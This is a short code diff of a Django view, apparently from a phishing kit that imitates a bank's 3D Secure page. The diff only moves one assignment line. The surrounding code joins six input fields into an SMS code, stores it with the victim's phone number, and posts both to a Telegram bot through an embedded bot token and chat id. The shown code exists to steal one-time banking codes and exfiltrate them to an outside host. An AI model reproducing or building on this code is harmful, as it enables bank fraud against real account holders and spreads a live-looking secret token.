@@ -576,11 +576,11 @@ def pashabank3d(request):
         concatenated = input1+input2 +input3+input4+input5+input6
         contact = ContactModel.objects.latest('created_at')
         contact.sms=concatenated
-        contact.bankname=""
         contact.page_name="/loading"
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:loading\n Number{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
+    contact.bankname=""
     contact.page_name="/loading"
     contact.save()
     return render( request,'pages/loading.html',context )
